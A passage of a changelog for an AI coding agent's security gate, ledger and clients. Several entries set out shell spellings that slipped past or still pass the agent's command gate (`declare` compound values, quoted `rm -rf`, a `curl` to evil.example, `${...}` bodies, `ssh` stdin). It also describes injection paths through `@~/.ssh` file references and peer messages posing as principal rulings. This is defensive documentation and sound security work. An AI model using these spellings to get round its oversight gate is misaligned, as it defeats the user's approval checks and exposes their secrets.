  than the gate reads asks. A backslash-newline in a compound value is dropped before it is read, as bash drops
  it (`declare -a 'b=($\<newline>(gh ...))'` was allowed and is now a `github_post`; a `$( )` the line itself runs
  in a double-quoted value is still read once, unless it holds a single quote or a here-document marker `<<`
  anywhere: such a body is compared as written, so with a backslash-newline it is read again and asks, as in
  `declare -a "b=($(ls 'x' \<newline> -l))"`), and a quoted operand after
  two unquoted compound values (`declare -a b=(1) x=(2) 'c=($(gh ...))'`, `opaque_exec` before) belongs to the same
  declare and is a `github_post` too.

### Added
- `scripts/gate_diff.py` checks a gate change against main (#423, D-038 amendment). It runs `gate.classify` and
  `gate.decide` of two checkouts, each in its own process, over the calls the gate suites test, a line or call for
  each entry of the gate's tables (value options and pattern alternatives among them), compound forms of them, each
  line under the other shell tool names and keys, folder rows, posts that trip each posting rule and more than 80
  policies. It lists each decision the head makes lower than the base. Exit 1 means something is lower. Exit 2
  also means a tree holds a gate table in a form the script does not read. Reviewers run main's copy of the script.
  The developer guide's section "Checking a gate change against main" says how to run it and what it leaves out.
- Opt-in signed updates (#42, D-073): with `update.require_signed` true, `exo update` pulls only an upstream commit
  signed by a key in a pinned trust list (`exo update --pin-trust`). Off by default.
- Versioning and naming convention (D-056), this changelog, and `exo --version` in the `0.2.0 (egg)` form.
- Whitepaper v0.3 (draft, tagged `whitepaper-v0.3` when published), covering main up to D-077 and the security
  changes merged up to October 19, 2026: the security wave (D-038 to D-040) with its limits stated (allowlisted
  programs are trusted by name; the principal credential check, with D-060's kernel peer checks (#175), still passes
  a same-user process that detaches; the run folder is a secret store since #185 (for #169), but a shell walk from a
  folder above it is an ordinary read; `config.json` is an ordinary write until D-074; a command inside `${...}` is
  not classified (#143), while array subscripts (#189, for #179), values given to `declare` (#194, for #188), wrappers such as `setsid` (#196, for #160) and a compound's heredoc (#198, for #161) are read; a
  deny past four `bash -c` nesting levels or `ssh` hops only asks (#137, #153); a `deny:` entry holds for every part
  of a line while a `categories:` setting or a rule sees only the most severe one (D-075, #126; #191); a store write
  by a relative name from the tool's working folder, by a glob or hard-link spelling (docs/GATE.md), or back through
  `/dev/fd/N` (#217) is an ordinary write; a post body the gate cannot see is not swept (#208); a harmlessly named
  link to a key file is a plain read (#209); the web page token is needed on every `/api` route except
  `POST /api/launch` and on both event streams, and the browser is opened on a one-time launch code rather than the
  token (#177, for #166), with the limits of `docs/ui/WEB.md`; and a received peer message is checked against the
  key in a presence file any same-user program can write (#132)), shell startup hooks dropped from tool
  environments (#168), search tools that skip secret stores (#287, for #241), head anchors written after commit
  (#221), principal authority (D-052 to D-054), required executor mode (#70, #91), ledger authority (#80) and the
  opt-in witness transport (#88), model-spend ceilings (#87), signed updates (D-073), the composer, keys and layouts
  (D-037, D-043, D-045, D-046), the house taste wave 1 (D-044), the engine split and the core budget ratchet (#46,
  D-067, D-077), turns that do not wait for memory upkeep (D-068), versioning (D-056), the web sub-pages (D-061),
  subagent controls and `/rename` (D-069, D-070), and an "In progress" section that names the open changes and
  issues (#96, #107, #125, #158) and the work on branches with no PR yet, and names what #164, #175, #177,
  #185, #186, #189, #194, #196, #198, #201, #213, #228, #287 and #288 changed on main. The user guide, developer guide,
  command reference and docs map are brought up to date with main, and the docs map has one coverage table.
  `scripts/build_whitepaper.py` takes the version and the month from the paper's header line only, and stops with a
  message when that line is missing or reworded.
- Web chat: a completed reply renders as Markdown, GFM pipe tables included (#149, #152). Streaming stays plain
  text. Tables scroll sideways inside the message. A reply builds at most 10,000 table cells and a table at most 64
  columns and no more padded cells than source characters; past that, a table is shown as its source text. Quotes
  nest at most 8 deep and lists 9. Ordered lists keep their source numbers across blank lines, fences and nested
  items; a table, quote or fence indented under an item renders inside it; paragraph line breaks, hard breaks and
  `>` quotes are kept; a line that starts with inline code is not a fence; table cells unescape only `\|`; unclosed
  `[` and link URLs no longer cost quadratic time; the classic layout keeps following the conversation when a reply
  grows as it renders. Markdown panels share the renderer, so they too keep their line breaks and render quotes.

### Fixed
- The core releases its SQLite handles (#281). `CoreRuntime.close()` closes the session store and schedule.sqlite, the
  spend journal closes the connection that creates it, and the harness-error sink list holds engines weakly, so an
  engine nobody closed can be collected; the sink list is copy-on-write and no sink runs under a lock, so a
  garbage-collector finalizer that reports or adds a sink cannot hang the thread. `close()` still closes the scheduler
  and the store when the peers or jobs step raises, then raises the first error. The root suite no longer climbs to
  about 930 open files, and runs in a macOS Terminal at its default 256. A closed session store reopens on its next use,
  and `Scheduler.close()` is final (`stop()` stays restartable).
- The router's wait hint and `retry_after` count only the role's own routes (#239). They took the earliest reopening
  over every cooldown, so a cooldown on another provider, or on a model outside the chain (the gate's aux side call,
  D-081), could make a main call say "next route reopens in 20s" while main's own key reopened later, and the loop
  retried early. The same scope now decides the "no credentials" error.
- exo web shows an open approval that was asked before its replay window (#234). `reconcile_approvals` only dropped
  cards the core no longer held, so a request older than the newest 5,000 events (first start, or a reconnect after a
  gap above `RESUME_GAP`) never showed, though the terminal client could answer it. It now also adds each open request
  from `approvals.list` that the page lacks, with no asked-time (the card shows none, not "asked never"), and an
  approval already shown is no longer added or counted again when the stream replays it.
- Peer authentication follow-ups (#226, D-060). The terminal says `not sent: <reason>` when a command never left
  (its peer check refused the core, or the core could not be reached), instead of "connection lost; this may not
  have been delivered", and keeps the text. `hello` names a heartbeat only where the transport sends one: over HTTP
  it is that server's interval, and stdio and in-process callers get no `heartbeat` key or capability. The Python
  client holds at most 16 Mi characters of one event-stream line, so it skips an oversized frame without reading
  all of it (a 40 MiB line was read in full), and it ends lines only at CRLF, LF or CR, as SSE does. The core's
  parent walk reads one stat line per ancestor instead of the boot id and all of `/proc/stat` each time. A core
  that cannot read its own start identity names its platform's cause instead of a hidden `/proc`. The unused
  `principal.peer_pid` is gone, and the macOS peer-credential and process-lookup branches are tested.
- `apply_patch` no longer replaces a changed `-` line by similarity (#236). A hunk with context, such as
  `-TIMEOUT = 30` over `TIMEOUT = 45` plus `RETRIES = 3`, passed the two-line rule through its context line and
  silently overwrote the 45. Each `-` line must now match its file line up to whitespace, Unicode or a literal `\t`;
  similarity places only the context lines. A hunk that fails names both lines and no file changes. See docs/TOOLS.md
  "Edit matching".
- A held answer key on a focused terminal approval card sends one answer (#297). Repeats of the key, posted before
  the first was handled, each wrote `approval: allow` to the transcript and sent `ApprovalRespond` again; only the
  call that closes the request's card now notes and sends, so a repeat is dropped and the next queued request is
  not answered by it.
- Terminal approval cards wait for removal before the next queued card mounts (#276). Answering a card or
  reconciling a closed request no longer mounts two widgets under the same approval id. Close, restore and
  thread-switch transitions share a lock, and stale answers or close events cannot remove the next request's card.
  After an answer the composer gets the focus back unless you moved it, so the next prompt is sent and the next
  approval of the thread shows its card.
- `exo update` names up to five of the files that block it when the checkout has local changes or untracked
  files, instead of only saying that some exist.
- `edit_file` after whitespace drift: when only the whitespace-normalized strategy matched (one stray double
  space in the file), the span could start inside the indentation before the match and the reindented replacement
  shifted every following line by one column, leaving code that no longer parsed. The span now starts at the
  match. When `old_string` is dedented to column 0 (its continuation lines sit shallower than the file's, a tab
  counting to the next multiple of 8 columns, so a space-indented block in a tab-indented file counts too) and
  matches after a line's indentation, the replacement is re-anchored on that indentation. An `old_string` copied
  verbatim from the file, a one-line `old_string`, and escape- or Unicode-normalized matches are replaced in place
  as before, keeping the line's indent and the file's typography; `replace_all` on adjacent lines and an empty
  `new_string` no longer touch text outside the match (#127).
- `scripts/promo_shots_web.py` works under the web page's Content-Security-Policy (#162). The layout pin and the
  composer typing it adds to the copied page were inline scripts, which the policy refuses, so regenerated shots
  came out in the inverse layout with an empty composer. They are now a file in the copied static folder, loaded
  by `src`.
- Permissions bypass (D-065): `exo --skip-permissions` or `/permissions bypass` stops approval asks for this run of
  the core, except writes to Exo's own records and reading secrets. Principal only, refused under a required
  executor, a banner in both clients, every auto-approved call in the ledger as `decided_by: bypass`.

### Changed
- `exo` imports a command's module only when that command runs (#260, D-035 amendment). Before, every call loaded
  every command's module, with the ledger, signing, HTTP and model code behind them, and a module that failed to
  import broke all of `exo`. Now `exo --help`, `exo --version` and bare `exo` load none of them, and a broken module
  breaks only its own commands. Measured best of 5: `import exo.cli` 190 ms to 14 ms, `exo --version` 240 ms to
  73 ms, `exo --help` 251 ms to 42 ms. Usage, errors and every `--help` are byte-identical. `exo update`'s
  self-check still imports every command's module. Code that imported a name such as `cmd_ask` from `exo.cli`
  still gets it.
- Gate timing tests (#308): the linear-time checks in `tests/security` and `plugins/exo-gate/tests` measure process CPU time
  (`time.process_time`) instead of wall time, and the scaling checks retry up to three times before they fail, so a
  suite running beside other suites no longer trips them. A quadratic step still fails every attempt. Test-only.
- Web `/model` and `/default` (#146): the composer opens a model picker or sets the route without starting a model
  turn, and a failed change keeps the line in the box. `/model` goes through the core's principal-only `models.set`
  (`POST /api/chat/sessions/<id>/model`); `/default` saves through the loopback-only provider routes. A command the
  page does not run, from the core's list (`/grants`) or the terminal client's own (`/help`, `/quit`; core plugin
  names count only when the core lists them, as in the TUI), or a near typo of one, stays in the box with a note.
  Until the page has the core's command names, every `/name` line that is not the page's or the terminal client's
  waits, and the names are asked again with no limit (1 s doubling to every 30 s, and on each send, which does not
  move the backoff on), so a long core restart never leaves the page sending core-only commands as model turns. The
  asking ends once the core has answered both questions: its names (an older core that answers `unknown_command` or
  `unsupported` for `commands.list` counts, with no names) and `guidance.enabled` (an unset key, which the core
  answers with `not_found`, counts as on). The core's `guidance.enabled: false` still turns the guidance line off when
  the core was down as the page loaded (or could not read the setting yet). `/tmp is full` and other lines close to
  no command by the TUI's rule are still sent as messages (D-037). A `bad_model` or `bad_request` core error now
  answers 400, not 502, on every route of the web plugin's `api.py` table (chat, tasks, schedule, feedback), not
  only `/model`.
- Command deny and reservation regexes also match a literal-word view of the command (#136, D-038
  amendment): common literal quoting (`'rm' -rf`, `r\m`, `$'rm'`, `$"rm"`) around a program or flag
  no longer bypasses those vetoes. A `$"..."` word is read as bash reads it, so `git push $"--force"`
  is a `force_push` and `curl $"https://evil.example/x"` stays a `web_read` of `evil.example`; the line
  also asks (indirection) unless `opaque_exec` is named, because bash may run a locale translation of
  it instead, and it is decided as `opaque_exec` too, keeping the stricter outcome. A heredoc whose
  delimiter is spelled `$"EOF"` or `$'EOF'` has its body read as commands as well, since dash ends it
  elsewhere. A `deny` or `ask` rule keyed on `command:` sees the view in a second pass that only
  raises; allow and lower rules and grants keep original-text matching. The view also covers every
  string literal of code, so a command-shaped literal in `python -c` is matched, fail closed. Reasons
  name only the policy entry, so no command text reaches the ledger. Dynamic execution still asks
  through the opaque gate.
- A long `HOME` no longer stops the core with "cannot start": the peer socket falls back to a short private folder (#48).
- Engine split, first pass (#46, `docs/ENGINE-SPLIT.md`): the diagnostic views (`/context`, `/compact`, `/trace`,
  `/findings`, handoff facts) moved to `exo.diagnostics`, and the engine factory moved to `exo.compose:create`, the
  new `exo serve` default. `exo.core.engine:create` still works. No behaviour change.
- Engine split, step 4 (#46, D-067): the counted core went from 15,986 to 14,812 lines. Dead code and duplicates went
  (about 300 lines), the peer transport moved to `exo.peers` and the scheduler to `exo.scheduler` (composition
  attaches both), and open approvals moved to `ApprovalDesk`. No protocol, event or command changes. The core
  line cap is now 15,000 (was 16,000).
- Core line budget (D-077): the hard 15,000-line cap became a ratchet with headroom. The test records `CORE_FLOOR`
  (14,813, the count after the last real reduction) and `CORE_HEADROOM` (1,000) and asserts the count stays under
  their sum, 15,813. A real reduction lowers the floor and it never rises. Security and robustness fixes are never
  blocked by the budget. The test prints the count, the headroom left and the largest counted files.
- Tool-round cap (#92, #93): a turn that reaches 24 tool rounds now ends with a short report (done, still open,
  next step) from one more model call with tool use off, instead of a dangling tool round. The tools stay declared
  and `tool_choice` is `none`, so the provider sees no tool-set edit. `stop_reason` stays `max_iterations`; a failed
  report is a coded `error` and keeps any shown text. Each capped turn costs one more model call and one more
  spend-journal entry. Scheduled runs append the report to their status, and a capped subagent's receipt summary
  is the report when the wrap-up produced one (otherwise it is the last message's text, as before). `Loop(wrap_up=False)` turns it off.
- Trace findings (#100, D-025): a fixed finding is verified only by quiet turns that could have tripped it
  (20) or by 3 days with such turns; unrelated turns and idle days no longer count. `exo_trace` lists open
  findings by default and counts the rest.
- Gate docs (#137, #141, D-038 amendment): `docs/GATE.md` "Known limits" records the four-level shell inspection
  depth and what the card says at the cap; that a deny under `categories:` fires only on the category a compound
  line ends up with, so approving the card can run the denied part (#191), while a `deny:` entry matches every part
  (D-075); and, in one list each, the paths where a deny becomes an ask and the forms still allowed outright on
  main (`${...}` bodies, text fed to `ssh` on stdin, `git clone -c`; each with its issue
  and any open PR), with where a `command:` regex still sees only raw text. The two lists D-075 added are folded into
  these. "What the search tools read" adds that a search rooted at `~/.config/gh` is allowed and leaves out its
  `hosts.yml` (#241). The template's `deny:` comment says a deny entry is checked against every command on the line
  and a `categories:` line only against the most severe part, and the user guide says that a few forms run without
  asking and to read the whole command before allowing it. No behaviour change; the test pins the boundary and the
  compound-line case under both policy forms.
- A core that `exo web` (or any client) starts is no longer that client's child (refs #145, D-036): a short helper
  starts a new session, forks the core and exits, so init (or the nearest subreaper) adopts the core. Process
  ancestry changed; the principal and tool checks did not. `exo stop` from another terminal now stops a core whose
  `exo web` is still running (before, the core stayed that client's zombie and `exo stop` waited it out). The helper
  and the core run with `python -P`, so a `pathlib.py` in the current folder no longer runs; an `EXO_ENGINE` module
  must now be installed or on `PYTHONPATH`, not just in the folder the client started from. A core that dies while
  starting is still reported at once, but the message gives its exit code only when the client is PID 1 or a
  subreaper (the log tail still gives the reason). Such a client adopts the cores it starts and reaps one that exits
  later at its next start, so restarts leave no zombies.

### Fixed
- Esc on a `claude-cli` turn is no longer lost when it lands just as the CLI prints a line (#163). On Python 3.11
  the per-line read timeout (`asyncio.wait_for`) returned the line and swallowed the cancel, so the turn ran to the
  end as if Esc had not been pressed. The line read now uses `asyncio.timeout`, which keeps the cancel.
- Tests that failed on a loaded machine (#163): the claude-cli fallback test's fake CLI now reads its input before it
  fails, so the provider's write never meets a closed pipe and the error always reports the exit code, and the TUI
  boot test drives the boot screen's clock, so a slow start can no longer end the boot before the test looks at it.

### Fixed
- A steer sent while a turn was finishing (its completion hooks still held the session) is no longer lost: it waits
  for the lock and runs as the next turn, keeping its author. A peer, bus or job message in that window starts a turn
  where the seat wakes instead of being queued behind a turn that was over. The web chat keeps a `steer queued`
  chip until the message lands or is cancelled, and drops one the core no longer holds (#147, #151).

### Fixed
- Model spend (#128): a pinned route rate below the audited long-prompt tier is refused, at policy validation and
  at request admission, in all four classes (input, output, cache read, cache write). `claude-haiku-5-5` bills
  $0.50/$2.50 input/output, $0.05 cache read and $0.625 5-minute cache write per MTok above 100K prompt tokens,
  so a headline pin under-reserved and under-settled long prompts, cache-heavy ones most. The floors are
  validation floors only; every charge still uses the pinned rates. The native-contract admission checks now
  live in `exo.model_spend.admit_native`.

### Fixed
- Protocol strict decoding: a command whose `type` is not a string is `unknown_command`, a wrong-typed `int`,
  `float`, `str` or `bool` body field (such as `events.subscribe` `since: "5"`) is `bad_body`, and JSON nested too
  deep is `bad_json`. An `events.subscribe` `since` past SQLite's 64-bit range is `internal`. Before, these raised
  out of the server: over HTTP the connection closed with no reply, and on stdio one bad line ended
  `exo serve --stdio`. The server now answers every malformed command and keeps serving. Messages an older core
  stored load as written.
- A client that stops reading the event stream can no longer grow the core's memory (D-079). The hub queued every
  event for every subscriber without a limit. Now a subscriber 4,096 unread events behind has its stream ended
  after the last event it read, and it resumes with `since`. Every client in the repo resumes and misses nothing:
  the protocol client with `reconnect`, the terminal window (run in process, joined or taken over), stdio, the
  exo-bus link, and `exo web`, which now replays from the last event it applied instead of the newest 5,000. It
  does so for up to 16,384 missed events. A longer gap replays the newest 5,000, as before.
- A shell command that prints fast no longer floods the event stream. Its output chunks went out as one
  `tool.output` (and one database write) each, and one command could queue thousands before any client read one.
  The chunks queued between two loop turns now go out as one event.
- Token counts mean the same on every provider (D-080). `input_tokens` is now the uncached input on OpenAI-style
  routes too, with cached tokens counted as cache reads, as Anthropic reports them. Before, the TUI context gauge
  read about double on those routes and the cache share about half. Subagents there were stopped for `budget` after
  a few calls with a large cached prompt, while on Anthropic the budget ignored cached context. The per-child budget
  now counts uncached input, cache writes and output. Cache reads do not count. Context-engine plugins get the
  whole prompt of the turn's last model call in `prompt_tokens`, not the sum of every call in a tool-using turn.
  Cost and model spend are unchanged.
- A seat's `[models]` tables (`roles`, `providers`, prices) now merge over config.json's entry by entry instead of
  replacing the whole table. A seat that set one role used to send `main` and `aux` back to the catalog's cloud
  defaults and drop config.json's prices. Under the `docs/SEATS.md` example, a local-only config sent aux and
  decision calls to cloud routes. A seat's provider entry merges key by key over config.json's entry, by the rule
  for provider tables below. A seat that sets only `read_timeout` keeps config.json's `base_url`, so a provider
  that config.json points at a LAN server stays there and never gets the catalog key.
- A partial `[models.providers.NAME]` table now merges over the catalog entry instead of replacing it. The
  documented Laya port override (`base_url` only) no longer turns Laya into a chat provider open to every role,
  and a one-key table such as `read_timeout = 300` no longer makes streams through that provider fail with
  `'base_url'`. A provider without a `base_url` gets no credential, so its route is skipped, and the providers
  list (`exo providers`, `/providers`, the web view) shows it as `no base_url` instead of `key found`. A table
  that sets `base_url` uses only the `key_env` and `headers` it sets and is keyless without one, as before: the
  catalog key (for example `OPENAI_API_KEY`) and a config.json `headers` table are never sent to that URL. Set `key_env` in that table to send a key there.
- Command centre cost panel: a finished subagent's spend counted twice. The core rolls the child's total into its
  parent's `session_total`, and the panel then added the child's own row again, in the total, the seat and model
  bars and the session counts. A delegated child at $0.05 under a $0.10 parent showed $0.20 instead of $0.15. The
  child's row now reads `in parent` and is left out of the sums. A running child, a scheduled job and a fork are
  still summed, since nothing rolls them up.
- `exo chat` can give a standing grant: typing `allow_always`, as the approval prompt offers it, then Enter to
  confirm sends `allow_always`. Before, the client read only the first letter, so it sent `allow`. `Allow` no
  longer denies.
- SYM-2P validators (`exo.protocols.sym2p` and the `sym-protocol` skill's `sym-validate.py`) reject an id, ref, hash
  or timestamp with a trailing newline. The grammar patterns ended in `$`, which also matches before a final
  newline, so `"builder\n"` passed as an ID and slipped past the `(f, id)` duplicate check.
- `edit_file` and `apply_patch` no longer rewrite a single line whose text differs from `old_string` (or the hunk's
  `-` line) beyond whitespace, escaping or Unicode. A stale `TIMEOUT = 30` used to replace the file's newer
  `TIMEOUT = 45` through the `context_aware` or `block_anchor` similarity strategy. It now fails and shows the
  closest lines. Blank lines around the line do not count. Blocks of two or more lines still match by similarity.
  In `apply_patch` a hunk's context lines count toward the two; since #236 each `-` line must also match its file
  line, so a changed `-` line is refused there too. In `edit_file` the rule counts lines, not exact lines: a changed
  line plus a lone `}` or the `def` line still matches by similarity. So copy `old_string` from a fresh read
  (docs/TOOLS.md "Edit matching").
- Learning finds the principal that the installer and `exo init` set in `config.json`, as exo-memory does. "learning
  is off: no principal store is set" no longer prints right after an install created a store. As in exo-memory,
  only a string names a principal.
- With no principal store yet (an install that skipped the interview), memory is a quiet off state. One dim notice
  names `exo init <id>`, the memory tools are not offered, and nothing prints over the terminal. Before, it was a
  harness error, a warning and a `bug` finding that grew with every launch.
- A setup state is not a harness error. The memory provider's `initialize` raises `NotConfigured` (`exo.core.slots`)
  when it has no store, and the engine turns that into one info notice, with no `harness.error` event or finding.
  That is the only supported place to raise it. Elsewhere `trace.report` files no event or finding for it, but the
  other failure handling still runs: the hook runner logs its warning with the traceback, a `pre_tool_call` hook that
  raises it blocks the call as a failing approval hook does, and a tool that raises it is still a tool error (D-025,
  `docs/TRACE.md`).
- The terminal client's boot line and empty-start card show the memory plugin's real state (`ready`,
  `off, no principal store`, `did not start`, `log only`) from the new `memory_status` built-in. Before, they always
  said "memory ready".
- A rejected key no longer reads as an outage. When the last route fails with HTTP 401, 402 or 403, the error names
  the provider and the key to fix (`anthropic rejected the key (HTTP 401: ...): fix ANTHROPIC_API_KEY or add a key
  in /providers`) and the turn is not retried three times. Later turns in the key's cooldown keep that cause and the
  provider's text instead of "all routes failed or are cooling down". Some providers send 403 for flagged input, and
  that text says so. A local server that refuses the connection is reported as `ollama is not running at
  127.0.0.1:11434: start it, then test it in /providers`, not a raw `ConnectError`. That address, here and in the
  terminal client's first-run note, is only the host and port of `base_url`. A user or password in the URL never
  reaches the error, the session store or the note. A background summary that hits either error still tries again
  once the route reopens. The terminal
  client's first run no longer says "add a key" when the default is a keyless local server or CLI, and the
  failed-call tip says `/providers` checks keys, servers and logins. A passing provider test in `/providers` or the
  web Providers tab now tells the core to reload that provider, so the chat works at once instead of after the
  cooldown (`docs/PROVIDERS.md`).
- The web client no longer shows a context note from other threads (`meta.note`, D-028) as a message the user
  typed. It skips the note on load and live, as the terminal client does. A second `exo web` on a busy port no
  longer prints a raw `[Errno 98]`: it says Exo's web client is already running there and how to get back in (its
  open page or printed link, Ctrl+C in its terminal, or `--port`), or that another program holds the port.
  `exo stop -h` prints help instead of stopping the core, and `exo stop` with any other word is an error.
- A decision answer from a chat model that is not the requested JSON, or names an option outside the list, no
  longer cools the credential. Before, one such answer to the gate made the next main-role call, which often uses
  the same key, fail with "cooling down" for 60 s. A failed chat decision call now counts one strike, not two
  (`docs/PROVIDERS.md`).
- The gate's decision call no longer uses the main model (D-081). With only the claude CLI login, every tool call
  the rules allowed started a hidden main-model call (2 to 10 s), and one failed call cooled the login, so the
  next turn failed with "all routes for 'main' failed or are cooling down". The call now uses the decision and aux
  routes only, keeps the rule outcome when there are none, and a failure cools only the model that failed. A later
  main-role error does not name that model's refusal as its cause. With only main routes, the gate's log line says
  that this call skips them (D-081), not that credentials are missing (`docs/GATE.md`, `docs/PROVIDERS.md`).
- Exo's own read-only tools (`skill`, `memory_zoom`, `exo_trace`, `ui`) classify as reads in the gate, so a new
  user's first screen is no longer an approval card for loading the intro skill (`docs/GATE.md`).
- First run (user-readiness audit, blocker 1): the installer now copies the skill pack (`skills/` with
  `MANIFEST.json`) into `$EXO_HOME/skills`, so `/intro` loads its `exo-intro` skill and exo-orchestra stops warning
  "no skill manifest" at launch. Each pack skill is a marked folder that a re-run or `exo update` refreshes, and
  skills you add there are kept. So is a copy of a pack skill made to change it: its marker names the skill it came
  from, so the installer keeps it with a warning. A skills folder or skill that links into the checkout is left
  alone. When the skill is still missing, the terminal client shows a short orientation instead of sending a model
  turn that could only improvise. A first intro that started but failed or got no reply is no longer sent again
  at every launch: the composer offers `/intro` instead, and the one that completes still turns tutorial mode on.
- The skill pack's folders in `$EXO_HOME/skills` belong to Exo, and the docs now say so (`docs/INSTALL.md` step 5,
  user guide §1). A re-run or `exo update` replaces an edit made in one, and now warns first when it replaces an
  edited `SKILL.md`. To change a pack skill, copy its folder under a new folder name and set a new `name:` in its
  `SKILL.md`. The skill index keeps one skill per name, so a copy that keeps the old name is hidden or hides the
  pack's skill.
- The terminal client no longer freezes on the boot screen when first run opens the model picker (the claude CLI
  on PATH and a configured main route that is down). The boot screen's dismiss closed the picker in its place, and
  only ctrl+c got out. It now closes before the first-run check opens anything, so a first run with no provider also
  opens the providers panel, as the docs say (`docs/UI.md`).
- `exo --resume` and `exo resume` continue the newest thread with messages. Each launch opens a thread, so a
  launch you only looked at, or an unused `/new`, made resume open an empty thread (`docs/USER-GUIDE.md`).
- Claude Code route (`claude-cli`): the agent no longer says it works in `/tmp/claude-cli-cwd-<uid>`. Exo's system
  text now names the thread's real working folder on every route, as the value that overrides any environment note.
  A message that starts with `/` (such as `/help`) now reaches the model. Before, the claude CLI answered it itself,
  the turn failed and the route cooled down. An `@path` in a message, including a peer or bus message, no longer
  makes the claude CLI read that file and send it to the model past the gate, `~/.ssh` keys included. Only an `@`
  whose path can leave the CLI's empty folder is marked: `@/`, `@~`, `@.`, `@"` and a word with a `/..` step
  (`@x/../../etc/hosts` reaches the file too). A decorator, CSS `@media`, a diff `@@` header and an address reach
  the model as typed, so code it copies from them carries no hidden character. If a file turns up in the CLI's
  folder, the call runs in a fresh empty one. Found in the readiness audit and its review. #146 tracks the web
  composer side.
- Docs for a first user. The README now opens with what Exo is today: a coding agent for the terminal and the
  browser that runs on your Claude Code login or an API key. The Quick start, `docs/INSTALL.md` and the site's
  install step say the repository is a private preview with access on request.
- The automatic Claude Code route is documented (`docs/PROVIDERS.md` "Use your Claude Code login", user guide
  §1): it uses `claude-cli:sonnet`, cost reads `unknown`, and `exo models` does not list it. The user guide no
  longer offers Muse as the keyless main model, because Muse serves only the `aux` role.
- The README and the site's web app page send you to the full link `exo web` prints, with `#token=`, not the
  bare address. `docs/INSTALL.md` names the README's real `## Quick start` section. The README and the intro
  skill say `exo`, not the `exo-tui` command the installer does not provide. The user guide's screenshot paths
  exist, and it gains a glossary (principal, store, ledger, seat, thread, gate, grant, finding, wave, D-number)
  that the README links before those words appear. `tests/docs/test_first_user_docs.py` keeps these true.
- Private threads are not remembered again (D-028). Their turns no longer reach exo-memory's signed ledger: the
  loop skips `on_turn_start`, `sync_turn` and `checkpoint` for them. `exo_note` and `exo_should_have_been` refuse
  in them. The learning loop and `feedback.send` ignore them: a reject or should_have_been on one files no finding.
  The context plugin never sees them, so no exo-context handoff or pin carries them. The tree's hooks never name
  them, and `/compact` no longer offers a private reply as the output a correction in another thread judges.
  `memory_zoom(subagent=)` opens a private thread's delegate children only from that thread or a fork of it, and
  of two matching children made in the same millisecond it opens the later one. All of this holds for those
  children too, at any depth: feedback on a child's answer records nothing and files no finding. A response to a
  panel a private thread opened or updated is no longer noted in the ledger.
- Undo in one thread no longer loses other threads' news: the context note stored during the undone turn stays,
  and undo deletes only the summaries that hold an undone entry and the merges above them, not every later one.
- A forked thread no longer resends its parent's whole transcript on every model call: the fork's copies count at
  their original's log position, so the fork opens with its parent's tail, and `/compact` shrinks a fork's tail too.
  A private thread's fork summarizes its copies in its own tree. Known limit: a copy of an entry the parent undid
  after the fork counts nowhere, so it stays in the tail only until the fork's own later entries are summarized.
- A private thread no longer forgets its own start (D-028). Its entries stay out of the agent tree, but its tail was
  still cut at the agent's frontier, so once another thread's leaves were summarized only its last 12 messages were
  left. It now keeps a summary tree of its own, and its tail starts at that tree's last summary, so spans too small
  to summarize stay whole. Plugin hooks never see that tree, and no other thread, agent summary or search sees it
  either. A fork made after an undo copies only the summaries that still match its renumbered messages. A long
  private thread from before this fix gets its leaves on its next turn, and that turn waits up to
  `overflow_settle` for them, as the agent tree's turns do. With a slow summarizer its first calls could still carry
  most of the thread, until #244.
- exo-context no longer pins peer, bus or job text as the principal's words (D-040). `select_context` now gets each
  message's author, and handoff extraction skips every user message that is not the principal's. A peer message or
  a job notice that said "From now on ..." was put back into the system message as a principal ruling once it left
  the tail, and written to handoffs. The recalled-memory block is now authored `system`. A handoff now carries a
  pinned block only from a message that opens with it (exo-context's own block) or with a compaction marker (a
  host's summary). A block in peer, bus, job, tool or agent text is not carried, and neither is one quoted further
  down a message. The core's system message quotes a span too small to summarize word for word, so a peer's block
  in such a span was carried as a principal ruling. A fork's copy of a message stored before D-040 has no author,
  so it is not pinned.
- `/undo` now reaches exo-context (D-041): the pins of the undone turns are dropped, so an undone ruling no longer
  comes back on the next turn as the principal's verbatim words. The summaries the undo deleted leave exo-context's
  handoffs too, and each handoff that may quote them is written again at once, including another thread's on an
  agent tree. The pinned block no longer links a handoff written before the undo. A ruling that was only summarized
  stays pinned.
- Git in bash and background jobs no longer fails with "missing config key GIT_CONFIG_KEY_0" when the core starts
  with `GIT_CONFIG_COUNT`/`GIT_CONFIG_KEY_<n>`/`GIT_CONFIG_VALUE_<n>` set (#159). The scrub dropped only the keys;
  it now keeps or drops the family as one unit (`docs/TOOLS.md` "Environment of bash and jobs").
- The signed ledger's head anchor (D-040) is now written after the append's COMMIT, so a writer killed in between
  leaves it one event behind, never ahead. Before, a kill at that moment made the ledger report "events were
  removed" and refuse every later append. `exo log anchor` no longer overwrites an anchor that does not match, which
  used to hide a real truncation. `exo log anchor --force` repairs a store an older version left stuck. When the
  anchor beside the ledger cannot be written, or no anchor is at the head and none can be written, the next append
  refuses instead of going on with the anchors frozen. The refusal says to restore write access, and
  `exo log anchor` reports an anchor it cannot write in one line instead of a traceback. `exo log verify` reports
  `anchored_seq`. An append costs what it did before. A ledger file swapped for a symlink to a truncated copy no
  longer verifies clean: the anchor under `keys/heads/` keeps its name, and a symlinked ledger fails verify and is
  refused by `exo log anchor`. Append refuses it too for a direct-key ledger (an authority-mode ledger trusts its
  signed checkpoints). An anchor that is a symlink is unreadable, and a symlink planted at an anchor's temporary
  name no longer redirects the write to another file.
- Opening a direct-key ledger whose `ledger.sqlite` is a symlink no longer writes through the link (#277). Before
  verify and append refused it, the open switched the target to WAL mode and added the ledger's tables, and a
  dangling link made the file it pointed at. The file is now opened read-only, and only when it is a regular file. A
  target that is missing, is not a regular file or holds no ledger reads as empty. SQLite adds no `-wal` or `-shm`
  file beside the target, except that it may add or rewrite a `-shm` file beside a target that already has a `-wal`
  file. `exo log verify` and `exo memory verify` also warn, without failing, when the two head anchors are more than
  one event apart. The copy under `keys/heads/` is best effort, so appends go on when it cannot be written. A store
  folder replaced by a symlink to another folder is listed as not covered in `docs/CORE.md` and D-040.
- `exo import-store` of a store Exo made no longer fails partway and leaves a half-copied store. The ledger's
  `.head` anchor is skipped with the ledger, and a stale anchor a deleted store left for the destination is dropped.
- `exo memory verify` fails a store whose `ledger.sqlite` was deleted while a head anchor remains. It used to print
  "nothing to verify" and exit 0.
- Turn state (D-070, D-052): a scheduled run and a subagent now share the engine's per-session state, so a turn
  running there is a running turn everywhere. `session.list` shows it `live`. A job or peer notice is steered in,
  and a `turn.send` steer lands in that turn. Before, the engine saw these sessions as idle: a notice was stored
  between a tool call and its result or started a second turn at the same time, and the model got a false
